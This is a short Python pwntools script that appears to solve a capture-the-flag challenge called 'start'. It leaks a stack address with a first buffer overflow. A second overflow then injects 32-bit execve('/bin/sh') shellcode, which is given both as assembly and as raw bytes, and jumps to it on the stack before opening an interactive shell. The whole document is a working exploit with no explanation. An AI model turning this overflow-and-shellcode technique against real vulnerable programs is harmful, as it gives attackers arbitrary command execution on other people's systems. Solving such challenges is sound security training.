from pwn import *

"""
shell_code = asm('\n'.join([
    'push %d' % u32('/sh\0'),
    'push %d' % u32('/bin'),
    'xor edx, edx',
    'xor ecx, ecx',
    'mov ebx, esp',
    'mov eax, 0xb',
    'int 0x80',
]))
"""
shell_code = b'h/sh\x00h/bin1\xd21\xc9\x89\xe3\xb8\x0b\x00\x00\x00\xcd\x80'
print("shellcode: ", shell_code)

r = process("./start")
print(r.recvuntil(":"))
r.send(b'A'*0x14 + p32(0x08048087))
esp = u32(r.recv(4))
print("esp: ", esp, hex(esp))

r.send(b"B"*0x14 + p32(esp + 0x14) + shell_code)
#r.sendline(b"B"*0x14 + p32(0x804809d))
r.interactive()
